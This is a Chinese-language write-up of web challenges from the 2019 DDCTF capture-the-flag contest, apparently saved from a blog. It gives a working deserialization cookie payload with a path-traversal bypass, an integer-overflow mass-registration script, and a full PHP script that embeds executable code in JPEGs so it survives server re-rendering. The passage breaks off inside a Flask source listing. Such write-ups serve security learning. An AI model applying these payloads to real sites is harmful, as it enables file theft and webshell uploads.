@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>2019DDCTF | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="滴 进入题目，观察url  http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09比较明显应该是base64编码了。 两次base64解码。 666C61672E6A7067 应该为16进制，直接十六进制转化字符串。  只要文件存在应该就可以读取文件，dirsearch扫描目录。  尝试读取index.php文件，">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019DDCTF">
+<meta property="og:url" content="http://yoursite.com/2019/04/14/2019DDCTF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="滴 进入题目，观察url  http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09比较明显应该是base64编码了。 两次base64解码。 666C61672E6A7067 应该为16进制，直接十六进制转化字符串。  只要文件存在应该就可以读取文件，dirsearch扫描目录。  尝试读取index.php文件，">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555234353.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555234297.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555234263.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555238585.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555238797.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555239052.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555239153.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555239451.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555237562.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555240122.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555241769.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555242779.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555304033.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555304091.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555304139.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555310195.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555328687.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555328840.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555328986.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555329350.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555329488.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555571018.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555572984.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555588231.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555579003.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555579055.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555665443.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555665488.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555740061.jpg">
+<meta property="og:updated_time" content="2019-04-20T06:07:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019DDCTF">
+<meta name="twitter:description" content="滴 进入题目，观察url  http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09比较明显应该是base64编码了。 两次base64解码。 666C61672E6A7067 应该为16进制，直接十六进制转化字符串。  只要文件存在应该就可以读取文件，dirsearch扫描目录。  尝试读取index.php文件，">
+<meta name="twitter:image" content="http://47.106.185.69/1/./img/1555234353.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-2019DDCTF" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/14/2019DDCTF/" class="article-date">
+  <time datetime="2019-04-13T16:00:00.000Z" itemprop="datePublished">2019-04-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2019DDCTF
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="http://47.106.185.69/1/./img/1555234353.jpg" alt></p>
+<h1 id="滴"><a href="#滴" class="headerlink" title="滴"></a>滴</h1><p><img src="http://47.106.185.69/1/./img/1555234297.jpg" alt></p>
+<p>进入题目，观察url </p>
+<pre><code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code></pre><p>比较明显应该是base64编码了。</p>
+<p>两次base64解码。</p>
+<pre><code>666C61672E6A7067 </code></pre><p>应该为16进制，直接十六进制转化字符串。</p>
+<p><img src="http://47.106.185.69/1/./img/1555234263.jpg" alt></p>
+<p>只要文件存在应该就可以读取文件，dirsearch扫描目录。</p>
+<p><img src="http://47.106.185.69/1/./img/1555238585.jpg" alt></p>
+<p>尝试读取index.php文件，查看源码。发现base64的 data数据流。</p>
+<p><img src="http://47.106.185.69/1/./img/1555238797.jpg" alt></p>
+<p>解码base64得到源码。</p>
+<pre><code>&lt;?php
+/*
+ * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
+ * Date: July 4,2018
+ */
+error_reporting(E_ALL || ~E_NOTICE);
+
+
+header(&apos;content-type:text/html;charset=utf-8&apos;);
+if(! isset($_GET[&apos;jpg&apos;]))
+    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);
+$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));
+echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;
+$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
+echo $file.&apos;&lt;/br&gt;&apos;;
+$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
+echo $file.&apos;&lt;/br&gt;&apos;;
+$txt = base64_encode(file_get_contents($file));
+
+echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;
+/*
+ * Can you find the flag file?
+ *
+ */
+?&gt;</code></pre><p>正则绕了半天，发现绕不过去，此时上面有个注释一篇文章，应该是有根据出现的。这个题确实坑，出的没啥意义，最后发现和这篇文章没啥关系，还有一行注释Date: July 4,2018，找到这一天日期的文章。</p>
+<p><img src="http://47.106.185.69/1/./img/1555239052.jpg" alt></p>
+<p>文中多次圈了practice.txt.swp文件，查看这个文件。</p>
+<p><img src="http://47.106.185.69/1/./img/1555239153.jpg" alt></p>
+<p>得到了新的提示，查看这个文件的源码，但是上文正则不允许出现！，相应的下面给了提示，config会自动替换成！，</p>
+<p>f1ag!ddctf.php  构造 f1agconfigddctf.php在进行16进制两次base64编码，得到base64的源码为：</p>
+<pre><code>&lt;?php
+include(&apos;config.php&apos;);
+$k = &apos;hello&apos;;
+extract($_GET);
+if(isset($uid))
+{
+    $content=trim(file_get_contents($k));
+    if($uid==$content)
+    {
+        echo $flag;
+    }
+    else
+    {
+        echo&apos;hello&apos;;
+    }
+}
+
+?&gt;</code></pre><p>变量覆盖掉原来的content，置为空得到flag。</p>
+<p><img src="http://47.106.185.69/1/./img/1555239451.jpg" alt></p>
+<h1 id="web签到题目"><a href="#web签到题目" class="headerlink" title="web签到题目"></a>web签到题目</h1><p><img src="http://47.106.185.69/1/./img/1555237562.jpg" alt></p>
+<p>抓包，发现存在第二个包，第一个提示没有权限，尝试填写admin管理员，成功返回php目录提示。</p>
+<p><img src="http://47.106.185.69/1/./img/1555240122.jpg" alt></p>
+<p>打开app//fL2XID2i0Cdh.php 文件获得源码。</p>
+<pre><code>url:app/Application.php
+
+
+Class Application {
+    var $path = &apos;&apos;;
+
+
+    public function response($data, $errMsg = &apos;success&apos;) {
+        $ret = [&apos;errMsg&apos; =&gt; $errMsg,
+            &apos;data&apos; =&gt; $data];
+        $ret = json_encode($ret);
+        header(&apos;Content-type: application/json&apos;);
+        echo $ret;
+
+    }
+
+    public function auth() {
+        $DIDICTF_ADMIN = &apos;admin&apos;;
+        if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) {
+            $this-&gt;response(&apos;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&apos;);
+            return TRUE;
+        }else{
+            $this-&gt;response(&apos;抱歉，您没有登陆权限，请获取权限后访问-----&apos;,&apos;error&apos;);
+            exit();
+        }
+
+    }
+    private function sanitizepath($path) {
+    $path = trim($path);
+    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);
+    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);
+    return $path;
+}
+
+public function __destruct() {
+    if(empty($this-&gt;path)) {
+        exit();
+    }else{
+        $path = $this-&gt;sanitizepath($this-&gt;path);
+        if(strlen($path) !== 18) {
+            exit();
+        }
+        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);
+    }
+    exit();
+}
+}
+
+
+
+
+url:app/Session.php
+
+
+
+include &apos;Application.php&apos;;
+class Session extends Application {
+
+    //key建议为8位字符串
+    var $eancrykey                  = &apos;&apos;;
+    var $cookie_expiration            = 7200;
+    var $cookie_name                = &apos;ddctf_id&apos;;
+    var $cookie_path                = &apos;&apos;;
+    var $cookie_domain                = &apos;&apos;;
+    var $cookie_secure                = FALSE;
+    var $activity                   = &quot;DiDiCTF&quot;;
+
+
+    public function index()
+    {
+    if(parent::auth()) {
+            $this-&gt;get_key();
+            if($this-&gt;session_read()) {
+                $data = &apos;DiDI Welcome you %s&apos;;
+                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);
+                parent::response($data,&apos;sucess&apos;);
+            }else{
+                $this-&gt;session_create();
+                $data = &apos;DiDI Welcome you&apos;;
+                parent::response($data,&apos;sucess&apos;);
+            }
+        }
+
+    }
+
+    private function get_key() {
+        //eancrykey  and flag under the folder
+        $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);
+    }
+
+    public function session_read() {
+        if(empty($_COOKIE)) {
+        return FALSE;
+        }
+
+        $session = $_COOKIE[$this-&gt;cookie_name];
+        if(!isset($session)) {
+            parent::response(&quot;session not found&quot;,&apos;error&apos;);
+            return FALSE;
+        }
+        $hash = substr($session,strlen($session)-32);
+        $session = substr($session,0,strlen($session)-32);
+
+        if($hash !== md5($this-&gt;eancrykey.$session)) {
+            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);
+            return FALSE;
+        }
+        $session = unserialize($session);
+
+
+        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;])){
+            return FALSE;
+        }
+
+        if(!empty($_POST[&quot;nickname&quot;])) {
+            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
+            $data = &quot;Welcome my friend %s&quot;;
+            foreach ($arr as $k =&gt; $v) {
+                $data = sprintf($data,$v);
+            }
+            parent::response($data,&quot;Welcome&quot;);
+        }
+
+        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) {
+            parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;);
+            return FALSE;
+        }
+        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) {
+            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);
+            return FALSE;
+        }
+        return TRUE;
+
+    }
+
+    private function session_create() {
+        $sessionid = &apos;&apos;;
+        while(strlen($sessionid) &lt; 32) {
+            $sessionid .= mt_rand(0,mt_getrandmax());
+        }
+
+        $userdata = array(
+            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),
+            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],
+            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],
+            &apos;user_data&apos; =&gt; &apos;&apos;,
+        );
+
+        $cookiedata = serialize($userdata);
+        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
+        $expire = $this-&gt;cookie_expiration + time();
+        setcookie(
+            $this-&gt;cookie_name,
+            $cookiedata,
+            $expire,
+            $this-&gt;cookie_path,
+            $this-&gt;cookie_domain,
+            $this-&gt;cookie_secure
+            );
+
+    }
+}
+
+
+$ddctf = new Session();
+$ddctf-&gt;index();</code></pre><p>通读php文件，可以看到获得flag的关键代码在Application.php读取文件这一行，</p>
+<pre><code>public function __destruct() 
+{
+    if(empty($this-&gt;path)) {
+        exit();
+    }else{
+        $path = $this-&gt;sanitizepath($this-&gt;path);
+        if(strlen($path) !== 18) {
+            exit();
+        }
+        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);
+    }
+    exit();
+}
+}</code></pre><p>可见，只要控制了path就可以读取任意文件，入手点在session.php文件中，包含了Application.php，所以从session.php入手，可以看到有一行       </p>
+<pre><code>$session = unserialize($session);</code></pre><p>会将我们的session反序列化，如果在session中加入path变量，反序列化调用class类，然后利用析构函数来执行读取文件的操作。</p>
+<p>查看session.php，只要function session_read()返回false，代码段，如果session_read()返回false</p>
+<pre><code>if(parent::auth()) {
+        $this-&gt;get_key();
+        if($this-&gt;session_read()) {
+            $data = &apos;DiDI Welcome you %s&apos;;
+            $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);
+            parent::response($data,&apos;sucess&apos;);
+        }
+        else{
+            $this-&gt;session_create();
+            $data = &apos;DiDI Welcome you&apos;;
+            parent::response($data,&apos;sucess&apos;);
+        }
+    }</code></pre><p>就会执行else中的session_create，我们构造的cookie中的session就会被覆盖，</p>
+<pre><code>if(!isset($session)) {
+            parent::response(&quot;session not found&quot;,&apos;error&apos;);
+            return FALSE;
+        }
+
+        $hash = substr($session,strlen($session)-32);
+        $session = substr($session,0,strlen($session)-32);
+
+        if($hash !== md5($this-&gt;eancrykey.$session)) {
+            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);
+            return FALSE;
+        }</code></pre><p>需要hash等于md5($this-&gt;eancrykey.$session)，自己构造的话，首先需要得到eancrykey，得到eancryket的代码段。</p>
+<pre><code>if(!empty($_POST[&quot;nickname&quot;])) {
+           $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
+           $data = &quot;Welcome my friend %s&quot;;
+           foreach ($arr as $k =&gt; $v) {
+               $data = sprintf($data,$v);
+           }
+           parent::response($data,&quot;Welcome&quot;); #eancrykey-&gt;EzblrbNS
+       }</code></pre><p>我们传入post参数，然后foreach，$V替换掉%s,也就是如果输入nickname=1，输出Welcome my friend 1，但是这样无法读取到eancrykey，第二次foreach，$data就变成Welcome my friend 1，无法获得eancrykey，但是如果第一次传入nickname=%s。第二次foreach的data依然是Welcome my friend %s，获得eancrykey。此时需要使用服务器饭回来的session，不然第一个代码段返回false，无法执行下面的代码。</p>
+<pre><code>if(empty($_COOKIE)) {
+    return FALSE;
+    }</code></pre><p><img src="http://47.106.185.69/1/./img/1555241769.jpg" alt></p>
+<p>获得eancrykey之后就可以绕过$hash !== md5($this-&gt;eancrykey.$session),从而执行 $session = unserialize($session);</p>
+<p>hash是我们传入的cookie的最后32位，md5($this-&gt;eancrykey.$session)是eancrykey加我们传入的去除掉最后32位cookie，然后在md5，这些都可控，构造使他们相等，最后构造poc，其中代码有一句注释告诉我们flag在哪里。</p>
+<pre><code>private function get_key() {
+      //eancrykey  and flag under the folder
+      $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);
+  }</code></pre><p>也就是flag在../config/目录下，其中../进行了过滤，../替换为空，双写绕过即可，….//，将../替换为空正好是../</p>
+<p>构造poc:</p>
+<pre><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525#需要url编码。</code></pre><p><img src="http://47.106.185.69/1/./img/1555242779.jpg" alt></p>
+<h1 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h1><p>这道题目考的相对简单，只有一个点，整数溢出。</p>
+<p>利用32位的位限制，2的32位为4294967295，只要超出就会变为33位从而溢出，但是最大32位，最终造成溢出，可以发现，购买的时候我们可以抓包修改价格，可以往高修改，但是无法修改低价格。设置价格为4294967296，正好多出一位，溢出。</p>
+<p><img src="http://47.106.185.69/1/./img/1555304033.jpg" alt><br><img src="http://47.106.185.69/1/./img/1555304091.jpg" alt></p>
+<p>此时价格已经发生改变，虽然数值变大了，但是直接支付是可以支付成功的。</p>
+<p><img src="http://47.106.185.69/1/./img/1555304139.jpg" alt></p>
+<p>此时就正常移除对手就可以，移除100个对手得到flag，写个脚本，注册获得id ticket，不断移除对手即可。</p>
+<p>但是一开始移除没有问题，后面发现，同ID好像只能移除一次，所以后期必须不断大量注册，必须写脚本。而生成的ID后期会一直重复，必须大量注册拼凑到100个不同的ID。</p>
+<p>接下来是脚本。跑了好一会快一个小时。。 - -。网络不佳。</p>
+<pre><code>import requests
+import time
+requests.packages.urllib3.disable_warnings()
+import re
+
+urlsss=&quot;http://117.51.147.155:5050/ctf/api/login?name=saddsadsa545&amp;password=saddsadsa545&quot;#这里写需要吃鸡的账号最终接受flag的账号
+ss=requests.Session()
+rr=ss.get(urlsss)
+
+for i in range(3500,10000):
+
+    try:
+        s=requests.Session()
+        register=&quot;http://117.51.147.155:5050//ctf/api/register?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot;
+        url=register%(str(i),str(i))
+        res=s.get(url)
+        print res.text
+        url=&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297&quot;
+        #login=&quot;http://117.51.147.155:5050/ctf/api/login?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot;
+        #logins=login%(str(i),str(i))
+        #s=requests.Session()
+        #r=s.get(logins,timeout=3)
+        r=s.get(url)
+        id=&quot;http://117.51.147.155:5050/ctf/api/search_bill_info&quot;
+        r=s.get(id)
+        a=r.text[32:68]
+        pay=&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot;
+        pays=pay%(str(a))
+        r=s.get(pays)
+        id=r.text[30:34]
+        tick=r.text[48:83]
+        id=id.replace(&quot;:&quot;, &quot;&quot;)
+        id=id.replace(&quot;,&quot;, &quot;&quot;)
+        id=id.replace(&apos;&quot;&apos;, &quot;&quot;)
+        tick=tick.replace(&apos;&quot;&apos;,&quot;&quot;)
+        tick=tick.replace(&apos;}&apos;,&quot;&quot;)
+        tick=tick.replace(&apos;]&apos;,&quot;&quot;)
+        tick=tick.replace(&apos;:&apos;,&quot;&quot;)
+        print id
+         print tick
+        yichu=&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot;
+        result=yichu%(str(id),str(tick))
+        rr=ss.get(result)
+        print rr.text
+
+    except Exception as e:
+           pass
+    time.sleep(1)</code></pre><p><img src="http://47.106.185.69/1/./img/1555310195.jpg" alt></p>
+<h1 id="Uoload-IMG"><a href="#Uoload-IMG" class="headerlink" title="Uoload-IMG"></a>Uoload-IMG</h1><p>这道题考点在图片上传的二次渲染，参考先知的一篇文章，很实用</p>
+<pre><code>https://xz.aliyun.com/t/2657</code></pre><p>在上传图片马的时候有种检查方式是图片渲染，对于图片一次渲染很容易绕过，只要不破坏图片结构即可，即插入了一句话打开图片，图像并不受任何影响，一般在16进制下在最后加上一句话或者在图片16进制中间空白处加上即可。</p>
+<p>本题用到了二次渲染知识，即，上传图片之后，服务器要对图片做第二次渲染，将符合图像的内容留下来。举个例子。</p>
+<p>16进制加入phpinfo()代码然后进行上传。</p>
+<p><img src="http://47.106.185.69/1/./img/1555328687.jpg" alt></p>
+<p><img src="http://47.106.185.69/1/./img/1555328840.jpg" alt></p>
+<p>此时服务器已经上传上去我们的图片，下载下来网站上已经上传成功的图片，</p>
+<p><img src="http://47.106.185.69/1/./img/1555328986.jpg" alt></p>
+<p>发现我们上传的图片中的phpinfo不见了，而且图片中有个特征，gd库渲染，说明是使用了二次渲染，此时就明白了考点，使用二次渲染绕过。</p>
+<p>先知社区的文章说明的很清楚包括jpg,gif,png，这里使用jpg来绕过上传。</p>
+<p>文件jpg_payload.php</p>
+<pre><code>&lt;?php
+    /*
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php &lt;jpg_name.jpg&gt;
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+    Sergey Bobrov @Black2Fan.
+
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+    */
+
+    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;
+
+
+    if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) {
+        die(&apos;php-gd is not installed&apos;);
+    }
+
+    if(!isset($argv[1])) {
+        die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);
+    }
+
+    set_error_handler(&quot;custom_error_handler&quot;);
+
+    for($pad = 0; $pad &lt; 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis-&gt;readShort() != 0xFFD8) {
+            die(&apos;Incorrect SOI marker&apos;);
+        }
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis-&gt;eof())) {
+                        if($dis-&gt;readByte() === 0xFF) {
+                            if($dis-&gt;readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) {
+                    die(&apos;Success!&apos;);
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink(&apos;payload_&apos;.$argv[1]);
+    die(&apos;Something\&apos;s wrong&apos;);
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this-&gt;binData = &apos;&apos;;
+            $this-&gt;order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);
+                $this-&gt;binData = file_get_contents($filename);
+            } else {
+                $this-&gt;binData = $filename;
+            }
+            $this-&gt;size = strlen($this-&gt;binData);
+        }
+
+        public function seek() {
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        }
+
+        public function skip($skip) {
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        }
+
+        public function readByte() {
+            if($this-&gt;eof()) {
+                die(&apos;End Of File&apos;);
+            }
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this-&gt;binData) &lt; 2) {
+                die(&apos;End Of File&apos;);
+            }
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) {
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        }
+    }
+?&gt;</code></pre><p>1.首先上传1.jpg到ctf平台上，然后下载经过网站二次渲染后的图片,保存为1.jpg</p>
+<p>2.执行命令  php jpg_payload.php 1.jpg</p>
+<p><img src="http://47.106.185.69/1/./img/1555329350.jpg" alt></p>
+<p>3.将生成的payload_1.jpg上传即可。也可以查看网站二次渲染后的图片可以发现，phpinfo()并没有因二次渲染而去除。</p>
+<p><img src="http://47.106.185.69/1/./img/1555329488.jpg" alt></p>
+<h1 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h1><p>一道flask python题目，开始以为是flask session伪造。然而并不是-0-！</p>
+<p>点开题目，先智能翻译以下英文。</p>
+<p><img src="http://47.106.185.69/1/./img/1555571018.jpg" alt></p>
+<p>这道题目是python flask的一道代码审计。给了源代码,不是很熟悉代码的最好在本地复现环境，比较容易理解。</p>
+<pre><code># -*- encoding: utf-8 -*- 
+# written in python 2.7 
+__author__ = &apos;garzon&apos; 
+
+from flask import Flask, session, request, Response 
+import urllib 
+
+app = Flask(__name__) 
+app.secret_key = &apos;*********************&apos; # censored 
+url_prefix = &apos;/d5af33f66147e857&apos; 
+
+def FLAG(): 
+    return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored 
+
+def trigger_event(event): 
+    session[&apos;log&apos;].append(event) 
+    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] 
+    if type(event) == type([]): 
+        request.event_queue += event 
+    else: 
+        request.event_queue.append(event) 
+
+def get_mid_str(haystack, prefix, postfix=None): 
+    haystack = haystack[haystack.find(prefix)+len(prefix):] 
+    if postfix is not None: 
+        haystack = haystack[:haystack.find(postfix)] 
+    return haystack 
+
+class RollBackException: pass 
+
+def execute_event_loop(): 
+    valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) 
+    resp = None 
+    while len(request.event_queue) &gt; 0: 
+        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; 
+        request.event_queue = request.event_queue[1:] 
+        if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue 
+        for c in event: 
+            if c not in valid_event_chars: break 
+        else: 
+            is_action = event[0] == &apos;a&apos; 
+            action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;) 
+            args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;) 
+            try: 
+                event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) 
+                ret_val = event_handler(args) 
+            except RollBackException: 
